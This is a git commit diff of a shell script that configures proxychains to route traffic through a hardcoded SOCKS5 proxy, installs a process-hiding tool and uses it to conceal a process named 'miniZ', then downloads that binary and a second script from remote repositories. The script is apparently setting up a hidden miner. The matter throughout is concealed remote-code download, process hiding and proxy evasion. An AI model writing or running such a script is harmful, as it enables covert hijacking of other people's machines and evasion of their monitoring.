7c5d2b4e815702fd429d5aaa150ca302f8a980c4
ariffirdaus778 <103154145+ariffirdaus778@users.noreply.github.com>
2022-05-27 10:20:38 +0700

    Update zzzzzzzzzz.sh

--- zzzzzzzzzz.sh
+++ zzzzzzzzzz.sh
@@ -3,7 +3,7 @@ apt install proxychains
 sed -i 's/socks4/socks5/' /etc/proxychains.conf
 sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
 sed -i 's/9050/10663/' /etc/proxychains.conf
-sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add memek
+sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add miniZ
 apt install screen -y
 wget -q https://gitlab.com/dif.hirugai888/phonix/-/raw/main/miniZ
 wget -q https://raw.githubusercontent.com/ariffirdaus778/sakaw/main/gabut.sh
